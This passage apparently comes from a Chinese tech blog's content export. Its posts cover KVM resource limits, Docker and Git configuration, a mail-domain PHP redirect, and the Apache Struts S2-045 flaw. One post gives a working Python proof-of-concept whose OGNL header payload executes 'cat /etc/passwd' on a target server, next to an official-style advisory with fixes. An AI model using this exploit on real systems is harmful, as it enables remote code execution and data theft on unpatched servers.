cpuset=&quot;0,4&quot;/&gt;&lt;emulatorpin cpuset=&quot;1-3&quot;/&gt;&lt;shares&gt;2048&lt;/shares&gt;&lt;period&gt;1000000&lt;/period&gt;&lt;quota&gt;-1&lt;/quota&gt;&lt;emulator_period&gt;1000000&lt;/emulator_period&gt;&lt;emulator_quota&gt;-1&lt;/emulator_quota&gt;&lt;/cputune&gt;&lt;/domain&gt; 主要参数说明：shares cpu权重，没有固定的数值，和其他的虚拟机相比较，那个的数值大，那个可以使用的cpu资源就多，比如设置2048值得虚拟机，就比设置1024数值的虚拟机可以多使用2倍的cpu资源。period vcpu强制间隔的时间周期，单位微秒，范围[1000, 1000000]，每一个vcpu不能使用超过period时间周期。quota vcpu最大允许带宽，单位微秒，范围[1000, 18446744073709551]emulator_period 强制间隔的时间周期，单位微妙，范围[1000, 1000000]，虚拟机进程(qemu)不能使用超过period时间周期。emulator_quota 虚拟机进程(qemu)最大允许带宽，单位微妙，范围[1000, 18446744073709551]。 实测结果对vcpu绑定有性能提升的效果，设置权重能控制CPU的资源利用。123virsh schedinfo --set cpu_shares=500 netb2cScheduler : posixcpu_shares : 500 四、内存资源的控制使用memtune可对实例使用内存资源进行控制 命令行格式为： 1memtune &lt;domain&gt; [--hard-limit &lt;number&gt;] [--soft-limit &lt;number&gt;] [--swap-hard-limit &lt;number&gt;] [--min-guarantee &lt;number&gt;] [--config] [--live] [--current] 命令行参数： 12345678[--domain] &lt;string&gt; domain name, id or uuid--hard-limit &lt;number&gt; Max memory, as scaled integer (default KiB)--soft-limit &lt;number&gt; Memory during contention, as scaled integer (default KiB)--swap-hard-limit &lt;number&gt; Max memory plus swap, as scaled integer (default KiB)--min-guarantee &lt;number&gt; Min guaranteed memory, as scaled integer (default KiB)--config affect next boot--live affect running domain--current affect current domain 实例xml配置为 12345678&lt;memory unit=&apos;KiB&apos;&gt;2097152&lt;/memory&gt;&lt;currentMemory unit=&apos;KiB&apos;&gt;2097152&lt;/currentMemory&gt;&lt;memtune&gt;&lt;hard_limit unit=&apos;KiB&apos;&gt;4194304&lt;/hard_limit&gt;&lt;soft_limit unit=&apos;KiB&apos;&gt;8388608&lt;/soft_limit&gt;&lt;min_guarantee unit=&apos;Kib&apos;&gt;1024000&lt;/min_guarantee&gt;&gt;&lt;swap_hard_limit unit=&apos;KiB&apos;&gt;4194304&lt;/swap_hard_limit&gt;&lt;/memtune&gt; 实测结果内存可以限制住，但一旦实例内存超限，会导致实例内存溢出从而宕机。 示例： 1virsh memtune netb2c --hard-limit 4194304 --soft-limit 8388608 --swap-hard-limit 4194304 --live --config 查看限制结果 1234virsh memtune netb2chard_limit : 4194304soft_limit : 8388608swap_hard_limit: 4194304","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"虚拟化","slug":"技术文档/Tools/虚拟化","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/虚拟化/"},{"name":"KVM","slug":"技术文档/Tools/虚拟化/KVM","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/虚拟化/KVM/"}],"tags":[{"name":"KVM","slug":"KVM","permalink":"http://blog.unixmen.cn/tags/KVM/"},{"name":"资源限制","slug":"资源限制","permalink":"http://blog.unixmen.cn/tags/资源限制/"},{"name":"性能优化","slug":"性能优化","permalink":"http://blog.unixmen.cn/tags/性能优化/"}]},{"title":"Struts-045 漏洞验证","slug":"Struts-045-漏洞验证","date":"2017-03-07T08:20:18.000Z","updated":"2017-03-08T01:18:35.926Z","comments":true,"path":"2017/03/07/Struts-045-漏洞验证/","link":"","permalink":"http://blog.unixmen.cn/2017/03/07/Struts-045-漏洞验证/","excerpt":"","text":"Struts-045-漏洞验证及漏洞修复后测试 接上篇注：本脚本仅为Struts-045漏洞验证及研究，严谨从事任何非法恶意操作。 一、脚本信息1234567891011121314151617181920#! /usr/bin/env python# encoding:utf-8import urllib2import sysfrom poster.encode import multipart_encodefrom poster.streaminghttp import register_openersdef poc(): register_openers() datagen, header = multipart_encode(&#123;&quot;image1&quot;: open(&quot;tmp.txt&quot;, &quot;rb&quot;)&#125;) header[&quot;User-Agent&quot;]=&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot; header[&quot;Content-Type&quot;]=&quot;%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;cat /etc/passwd&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot; request = urllib2.Request(str(sys.argv[1]),datagen,headers=header) response = urllib2.urlopen(request) print response.read()poc() 二、使用帮助 将脚本命名为st-045.py 在工作目录创建 image1 和 tmp.txt两个空文件 执行 python st-045.py URL如下图所示：三、漏洞修复后","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"struts2","slug":"struts2","permalink":"http://blog.unixmen.cn/tags/struts2/"}]},{"title":"关于Apache Struts2（S2-045）漏洞情况的通报","slug":"关于Apache-Struts2（S2-045）漏洞情况的通报","date":"2017-03-07T07:28:49.000Z","updated":"2017-03-07T07:52:55.681Z","comments":true,"path":"2017/03/07/关于Apache-Struts2（S2-045）漏洞情况的通报/","link":"","permalink":"http://blog.unixmen.cn/2017/03/07/关于Apache-Struts2（S2-045）漏洞情况的通报/","excerpt":"","text":"关于Apache Struts2 （S2-045）远程代码执行漏洞通报近日，国家信息安全漏洞库（CNNVD）收到关于Apache Struts2 （S2-045）远程代码执行漏洞（CNNVD-201703-152）的情况报送。由于该漏洞影响范围广，危害级别高，国家信息安全漏洞库（CNNVD）对此进行了跟踪分析，情况如下： 一、 漏洞简介Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级Java Web 应用的开源MVC框架，主要提供两个版本框架产品： Struts 1和Struts 2。 ApacheStruts 2.3.5 – 2.3.31版本及2.5 – 2.5.10版本存在远程代码执行漏洞（CNNVD-201703-152 ，CVE-2017-5638）。该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息。导致远程攻击者可通过发送恶意的数据包，利用该漏洞在受影响服务器上执行任意命令。 二、 漏洞危害攻击者可通过发送恶意构造的HTTP数据包利用该漏洞，在受影响服务器上执行系统命令，进一步可完全控制该服务器，造成拒绝服务、数据泄露、网站造篡改等影响。由于该漏洞利用无需任何前置条件（如开启dmi ，debug等功能）以及启用任何插件，因此漏洞危害较为严重。 三、 修复措施目前，Apache官方已针对该漏洞发布安全公告。请受影响用户及时检查是否受该漏洞影响。 自查方式 用户可查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar 文件，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。 升级修复 受影响用户可升级版本至Apache Struts 2.3.32 或 Apache Struts 2.5.10.1以消除漏洞影响。 临时缓解 如用户不方便升级，可采取如下临时解决方案： 删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。 相关链接官方Aapache Struts2（S2-045）安全公告","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"struts2","slug":"struts2","permalink":"http://blog.unixmen.cn/tags/struts2/"}]},{"title":"广告拦截APP\"AdClear\" for 安卓/iOS","slug":"广告拦截APPADclear-for-安卓-iOS","date":"2017-03-06T01:04:36.000Z","updated":"2017-03-06T06:54:33.568Z","comments":true,"path":"2017/03/06/广告拦截APPADclear-for-安卓-iOS/","link":"","permalink":"http://blog.unixmen.cn/2017/03/06/广告拦截APPADclear-for-安卓-iOS/","excerpt":"","text":"良心广告拦截APP分享：乐网AdClear，视频APP无需会员过滤广告 支持手机、平板 支持安卓、iOS 拦截系统内置广告 拦截视频软件广告 自身无广告 本地代理，建立VPN 无需root AppStore及安卓市场都可以搜到 从此观看视频一路畅通无阻。Enjoy it！","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"}],"tags":[{"name":"手机APP","slug":"手机APP","permalink":"http://blog.unixmen.cn/tags/手机APP/"},{"name":"工具","slug":"工具","permalink":"http://blog.unixmen.cn/tags/工具/"},{"name":"广告拦截","slug":"广告拦截","permalink":"http://blog.unixmen.cn/tags/广告拦截/"}]},{"title":"通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问","slug":"通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问","date":"2017-03-03T03:53:41.000Z","updated":"2017-03-06T06:52:44.635Z","comments":true,"path":"2017/03/03/通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问/","link":"","permalink":"http://blog.unixmen.cn/2017/03/03/通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问/","excerpt":"","text":"想用自己的域名发邮件，所以需要为域名开通个邮局业务，呵呵，就想到了免费邮局业务，现在提供免费企业邮局的厂家有很多，如腾讯、阿里、网易等，不过有个问题，就是免费邮局业务，现在都不支持绑定自己的域名进行访问登陆了，，，其实要想解决这个问题也非常的简单，只需要一个虚拟主机和一段PHP代码即可。 由于一直用腾讯微信、QQ，所以就用了腾讯免费企业邮局，通过搜索了解到景安提供的有免费虚拟主机，所以就选择他了，，，， 准备工作： 一个域名 已开通腾讯企业邮箱并设置正确解析 一个支持PHP的景安（免费）虚拟主机或者VPS 一、创建代码复制下面的代码，另存为index.php文件 1234&lt;?php $mail = file_get_contents(&quot;http://tel.exmail.qq.com/domain/mail.unixmen.cn&quot;); echo $mail;?&gt; 其中： unixmen.cn 为开通腾讯企业邮箱时所用域名(请改为自己的顶级域名) mail.unixmen.cn 为计划登陆访问时所用的域名 二、开通景安免费虚拟主机，绑定域名并解析 开通主机景安提供的有免费主机（下图左一）建议：如果使用收费的虚拟主机，只做登陆邮箱调转试用，选个便宜的，够用就行，我选了一个最低配置（下图右一）一年才49，土豪请随意。 考虑到虚拟主机还有其他用途，索性就买了个收费的业务。 注：无论是收费主机还是免费主机，以下操作或功能上没有区别。 添加域名绑定景安的虚拟主机如果不添加域名绑定，即便是解析正确，也无法访问，这个略屌。 添加解析 添加MX记录及添加CNAME解析到景安提供的三级域名。 解析生效 三、上传脚本程序使用FTP工具或者文件管理器将步骤一中创建的index.php文件上传到WEB文件夹中 四、测试访问如果上面的操作都没有错误的情况下，最后便可输入您的域名进行测试访问了，比如：mail.unixmen.cn 五、至此完成，可以使用自己的域名登陆企业邮箱了。如有问题欢迎吐槽打扰。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"}],"tags":[{"name":"其他","slug":"其他","permalink":"http://blog.unixmen.cn/tags/其他/"}]},{"title":"Docker 私有仓库无法上传镜像的问题","slug":"Docker-私有仓库无法上传镜像的问题","date":"2017-03-02T09:08:16.000Z","updated":"2017-03-29T00:41:20.682Z","comments":true,"path":"2017/03/02/Docker-私有仓库无法上传镜像的问题/","link":"","permalink":"http://blog.unixmen.cn/2017/03/02/Docker-私有仓库无法上传镜像的问题/","excerpt":"","text":"Docker 私有仓库启动后或者新节点配置私有仓库后，可能会出现无法push镜像到私有仓库，或无法pull镜像的问题如下图： 无法push镜像 无法pull镜像 导致原因：因为启动的registry服务不是安全可信赖的 解决方法如下： CentOS 6 修改docker的配置文件/etc/default/docker，添加下面的内容， 1DOCKER_OPTS=&quot;--insecure-registry xxx.xxx.xxx.xxx:5000&quot; 重启docker服务 1service docker restart CentOS 7 创建或修改 /etc/docker/daemon.json 文件，添加如下内容： 123&#123; &quot;insecure-registries&quot;: [&quot;xxx.xxx.xxx.xxx:5000&quot;] &#125; 重启Docker 服务 1systemctl restart docker 测试： push 测试 pull 测试","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"Trouble shooting","slug":"Trouble-shooting","permalink":"http://blog.unixmen.cn/tags/Trouble-shooting/"}]},{"title":"Docker配置Daocloud加速器","slug":"Docker配置Daocloud加速器","date":"2017-03-02T07:12:31.000Z","updated":"2017-03-29T00:40:48.572Z","comments":true,"path":"2017/03/02/Docker配置Daocloud加速器/","link":"","permalink":"http://blog.unixmen.cn/2017/03/02/Docker配置Daocloud加速器/","excerpt":"","text":"Docker 版本在 1.12 或更高创建或修改 /etc/docker/daemon.json 文件，修改为如下形式 （请将 加速地址 替换为在加速器页面获取的专属地址）Daocloud加速器地址 123456&#123; &quot;registry-mirrors&quot;: [ &quot;加速地址&quot; ], &quot;insecure-registries&quot;: []&#125;","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"容器配置","slug":"容器配置","permalink":"http://blog.unixmen.cn/tags/容器配置/"}]},{"title":"Docker配置HTTP代理","slug":"Docker配置HTTP代理","date":"2017-03-02T07:11:24.000Z","updated":"2017-03-29T00:42:18.624Z","comments":true,"path":"2017/03/02/Docker配置HTTP代理/","link":"","permalink":"http://blog.unixmen.cn/2017/03/02/Docker配置HTTP代理/","excerpt":"","text":"由于服务器处于内网，无法直接连接docker hub，需要配置代理使用，如图： CentOS 6下配置docker 的https_proxy 代理,只需要在/etc/sysconfig/docker 配置文件里面增加配置即可。 CentOS 7 无法使用这样的配置方式进行https_proxy 配置，原因为CentOS 7 使用systemd 来管理进程,我们需要添加https_proxy进行配置，步骤如下： 创建目录1mkdir /etc/systemd/system/docker.service.d 添加配置文件 12echo &quot;[Service]Environment=&quot;HTTP_PROXY=http://proxy.ip.com:80&quot;&quot;|tee /etc/systemd/system/docker.service.d/http-proxy.conf Reload systemd-daemon 12systemctl daemon-reload 重启docker服务 1systemctl restart docker 检查变量是否加载 1systemctl show docker --property Environment 测试是否生效","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"容器配置","slug":"容器配置","permalink":"http://blog.unixmen.cn/tags/容器配置/"}]},{"title":"Docker修改默认存储位置","slug":"Docker修改默认存储位置","date":"2017-03-02T07:10:23.000Z","updated":"2017-03-29T00:41:49.199Z","comments":true,"path":"2017/03/02/Docker修改默认存储位置/","link":"","permalink":"http://blog.unixmen.cn/2017/03/02/Docker修改默认存储位置/","excerpt":"","text":"停止docker 1systemctl stop docker 备份默认docker存储数据 1mv /var/lib/docker&#123;,.bak&#125; 创建docker数据存放文件夹 1mkdir /data/docker 创建软连接 1ln -s /data/docker/ /var/lib/docker 启动docker 1systemctl start docker 查看存储位置","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"容器配置","slug":"容器配置","permalink":"http://blog.unixmen.cn/tags/容器配置/"}]},{"title":"How to Install Docker Engine on CentOS 7.","slug":"How-to-install-docker-engine-on-CentOS-7","date":"2017-02-28T05:32:27.000Z","updated":"2017-03-06T06:54:18.807Z","comments":true,"path":"2017/02/28/How-to-install-docker-engine-on-CentOS-7/","link":"","permalink":"http://blog.unixmen.cn/2017/02/28/How-to-install-docker-engine-on-CentOS-7/","excerpt":"","text":"1.Remove default docker package.12yum -y remove docker docker-common container-selinuxyum -y remove docker-selinux 2.Install Docker engine123456yum install -y yum-utilsyum-config-manager --add-repo https://docs.docker.com/engine/installation/linux/repo_files/centos/docker.repoyum-config-manager --enable docker-testingyum-config-manager --disable docker-testingyum makecache fastyum -y install docker-engine","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"}]},{"title":"Git利用分支进行开发的工作流程","slug":"Git利用分支进行开发的工作流程","date":"2017-02-28T05:24:47.000Z","updated":"2017-05-02T09:25:42.854Z","comments":true,"path":"2017/02/28/Git利用分支进行开发的工作流程/","link":"","permalink":"http://blog.unixmen.cn/2017/02/28/Git利用分支进行开发的工作流程/","excerpt":"","text":"[toc] Git 利用分支进行开发的工作流程Git 作为一个源码管理系统，不可避免涉及到多人协作。协作必须有一个规范的工作流程，让大家有效地合作，使得项目井井有条地发展下去。”工作流程”在英语里，叫做”workflow”或者”flow”，原意是水流，比喻项目像水流那样，顺畅、自然地向前流动，不会发生冲击、对撞、甚至漩涡。 一、长期分支master 分支master 永远处于稳定状态，这个分支代码可以随时用来部署。不允许在该分支直接提交代码。 develop 分支开发分支，包含了项目最新的功能和代码，所有开发都在 develop 上进行。一般情况下小的修改直接在这个分支上提交代码。 二、短期分支feature 分支如果要改的一个东西会有比较多的修改，或者改的东西影响会比较大，请从 develop 分支开出一个 feature 分支，分支名约定为feature/xxx，开发完成后合并回 develop 分支并且删除这个 feature 分支，相应的操作如下： 1234567$ git checkout -b feature/xxx develop# 写代码，提交，写代码，提交。。。# feature 开发完成，合并回 develop$ git checkout develop# 务必加上 --no-ff，以保持分支的合并历史$ git merge --no-ff feature/xxx$ git branch -d feature/xxx 如果想要当前分支能保持与 develop 的更新，请用 rebase，操作如下： 12# 假设当前在 feature/xxx 分支$ git rebase develop rebase 会修改历史，如果你的 feature 分支是跟人合作开发的，请互相做好协调。 release 分支当 develop 上的功能和 bug 修得差不多的时候，我们就要发布新版本了，这个时候从 develop 分支上开出一个 release 分支，来做发布前的准备，分支名约定为release/20121221，主要是测试有没有什么 bug，如果有 bug 就直接在这个分支上修复，确定没有问题后就会合并到 master 分支。相应操作如下： 1234$ git checkout -b release/20121221 develop# 修复 bug、检查没问题后合并到 master 分支并删除$ git checkout master$ git merge --no-ff release/20121221 为了让 release 分支上 bug 修改作用到 develop 分支，我们还需要把这个 release 分支合并回 develop 分支： 1234$ git checkout develop$ git merge --no-ff release/20121221# 到此，这个 release 分支完成了它的使命，可以被删除了$ git branch -d release/20121221 hotfix 分支如果我们发现线上的代码（也就是 master）有 bug，但是这个时候我们的 develop 上的有些功能还没完成，还不能发布，这个时候我们可以从 master 分支上开出一个 hotfix 分支（记住：直接在 master 上提交代码是不允许的！），分支名约定为hotfix/xxx，在这个分支上修改完 bug 后需要把这个分支同时合并到 master 和 develop 分支。相应操作如下： 12345678$ git checkout -b hotfix/xxx master# 修完 bug 后$ git checkout master$ git merge --no-ff hotfix/xxx$ git checkout develop$ git merge --no-ff hotfix/xxx# hotfix 分支完成使命$ git branch -d hotfix/xxx 例外：当 hotfix 分支完成，这个时候如果有 release 分支存在，那么这个 hotfix 就应该合并到 release，而不是 develop 分支。 三、proj 分支proj 分支为项目分支，所有的项目分支都从 master 上开出来，约定的分支名为proj/xxx。所有的项目定制内容都直接在项目分支上提交。为了保证项目的更新，每当项目有新版本发布时都需要把 master 分支合并到 proj 分支上。相应操作如下： 12345$ git checkout -b proj/xxx master# 定制。。。# 如果 master 分支有更新$ git checkout proj/xxx master$ git merge --no-ff master","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"git","slug":"技术文档/Tools/git","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/git/"}],"tags":[{"name":"git","slug":"git","permalink":"http://blog.unixmen.cn/tags/git/"}]},{"title":"Git常用命令","slug":"Git常用命令","date":"2017-02-28T03:24:49.000Z","updated":"2017-05-02T09:24:59.774Z","comments":true,"path":"2017/02/28/Git常用命令/","link":"","permalink":"http://blog.unixmen.cn/2017/02/28/Git常用命令/","excerpt":"","text":"[toc] Git常用命令Git 命令行操作工作流程 Workspace：工作区 Index / Stage：暂存区 Repository：仓库区（或本地仓库） Remote：远程仓库 一、新建代码库 在当前目录新建一个Git代码库 1git init 新建一个目录，将其初始化为Git代码库 1git init [project-name] 下载一个项目和它的整个代码历史 1git clone [url] 二、配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 显示当前的Git配置 1git config --list 编辑Git配置文件 1git config -e [--global] 设置提交代码时的用户信息 12git config [--global] user.name &quot;[name]&quot;git config [--global] user.email &quot;[email address]&quot; 三、增加/删除文件 添加指定文件到暂存区 1git add [file1] [file2] ... 添加指定目录到暂存区，包括子目录 1git add [dir] 添加当前目录的所有文件到暂存区 1git add . 添加每个变化前，都会要求确认,对于同一个文件的多处变化，可以实现分次提交 1git add -p 删除工作区文件，并且将这次删除放入暂存区 1git rm [file1] [file2] ... 停止追踪指定文件，但该文件会保留在工作区 1git rm --cached [file] 改名文件，并且将这个改名放入暂存区 1git mv [file-original] [file-renamed] 四、代码提交 提交暂存区到仓库区 1git commit -m [message] 提交暂存区的指定文件到仓库区 1git commit [file1] [file2] ... -m [message] 提交工作区自上次commit之后的变化，直接到仓库区 1git commit -a 提交时显示所有diff信息 1git commit -v 使用一次新的commit，替代上一次提交, 如果代码没有任何新变化，则用来改写上一次commit的提交信息 1git commit --amend -m [message] 重做上一次commit，并包括指定文件的新变化 1git commit --amend [file1] [file2] ... 五、分支 列出所有本地分支 1git branch 列出所有远程分支 1git branch -r 列出所有本地分支和远程分支 1git branch -a 新建一个分支，但依然停留在当前分支 1git branch [branch-name] 新建一个分支，并切换到该分支 1git checkout -b [branch] 新建一个分支，指向指定commit 1git branch [branch] [commit] 新建一个分支，与指定的远程分支建立追踪关系 1git branch --track [branch] [remote-branch] 切换到指定分支，并更新工作区 1git checkout [branch-name] 切换到上一个分支 1git checkout - 建立追踪关系，在现有分支与指定的远程分支之间 1git branch --set-upstream [branch] [remote-branch] 合并指定分支到当前分支 1git merge [branch] 选择一个commit，合并进当前分支 1git cherry-pick [commit] 删除分支 1git branch -d [branch-name] 删除远程分支 12git push origin --delete [branch-name]git branch -dr [remote/branch] 六、标签 列出所有tag 1git tag 新建一个tag在当前commit 1git tag [tag] 新建一个tag在指定commit 1git tag [tag] [commit] 删除本地tag 1git tag -d [tag] 删除远程tag 1git push origin :refs/tags/[tagName] 查看tag信息 1git show [tag] 提交指定tag 1git push [remote] [tag] 提交所有tag 1git push [remote] --tags 新建一个分支，指向某个tag 1git checkout -b [branch] [tag] 七、查看信息 显示有变更的文件 1git status 显示当前分支的版本历史 1git log 显示commit历史，以及每次commit发生变更的文件 1git log --stat 搜索提交历史，根据关键词 1git log -S [keyword] 显示某个commit之后的所有变动，每个commit占据一行 1git log [tag] HEAD --pretty=format:%s 显示某个commit之后的所有变动，其”提交说明”必须符合搜索条件 1git log [tag] HEAD --grep feature 显示某个文件的版本历史，包括文件改名 12git log --follow [file]git whatchanged [file] 显示指定文件相关的每一次diff 1git log -p [file] 显示过去5次提交 1git log -5 --pretty --oneline 显示所有提交过的用户，按提交次数排序 1git shortlog -sn 显示指定文件是什么人在什么时间修改过 1git blame [file] 显示暂存区和工作区的差异 1git diff 显示暂存区和上一个commit的差异 1git diff --cached [file] 显示工作区与当前分支最新commit之间的差异 1git diff HEAD 显示两次提交之间的差异 1git diff [first-branch]...[second-branch] 显示今天你写了多少行代码 1git diff --shortstat &quot;@&#123;0 day ago&#125;&quot; 显示某次提交的元数据和内容变化 1git show [commit] 显示某次提交发生变化的文件 1git show --name-only [commit] 显示某次提交时，某个文件的内容 1git show [commit]:[filename] 显示当前分支的最近几次提交 1git reflog 八、远程同步 下载远程仓库的所有变动 1git fetch [remote] 显示所有远程仓库 1git remote -v 显示某个远程仓库的信息 1git remote show [remote] 增加一个新的远程仓库，并命名 1git remote add [shortname] [url] 取回远程仓库的变化，并与本地分支合并 1git pull [remote] [branch] 上传本地指定分支到远程仓库 1git push [remote] [branch] 强行推送当前分支到远程仓库，即使有冲突 1git push [remote] --force 推送所有分支到远程仓库 1git push [remote] --all 九、撤销 恢复暂存区的指定文件到工作区 1git checkout [file] 恢复某个commit的指定文件到暂存区和工作区 1git checkout [commit] [file] 恢复暂存区的所有文件到工作区 1git checkout . 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变 1git reset [file] 重置暂存区与工作区，与上一次commit保持一致 1git reset --hard 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变 1git reset [commit] 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致 1git reset --hard [commit] 重置当前HEAD为指定commit，但保持暂存区和工作区不变 1git reset --keep [commit] 新建一个commit，用来撤销指定commit 后者的所有变化都将被前者抵消，并且应用到当前分支 1git revert [commit] 暂时将未提交的变化移除，稍后再移入 12git stashgit stash pop 十、其他 生成一个可供发布的压缩包1git archive","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"git","slug":"技术文档/Tools/git","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/git/"}],"tags":[{"name":"git","slug":"git","permalink":"http://blog.unixmen.cn/tags/git/"},{"name":"git command","slug":"git-command","permalink":"http://blog.unixmen.cn/tags/git-command/"},{"name":"git 命令行","slug":"git-命令行","permalink":"http://blog.unixmen.cn/tags/git-命令行/"}]},{"title":"Git 基础操作","slug":"Git-基础操作","date":"2017-02-17T16:59:59.000Z","updated":"2017-05-02T09:25:20.928Z","comments":true,"path":"2017/02/18/Git-基础操作/","link":"","permalink":"http://blog.unixmen.cn/2017/02/18/Git-基础操作/","excerpt":"","text":"Git 是什么 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。 与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。 Git 与 SVN 区别GIT不仅仅是个版本控制系统，它也是个内容管理系统(CMS),工作管理系统等。如果你是一个具有使用SVN背景的人，你需要做一定的思想转换，来适应GIT提供的一些概念和特征。 区别： GIT是分布式的，SVN不是：这是GIT和其它非分布式的版本控制系统，例如SVN，CVS等，最核心的区别。 GIT把内容按元数据方式存储，而SVN是按文件：所有的资源控制系统都是把文件的元信息隐藏在一个类似.svn,.cvs等的文件夹里。 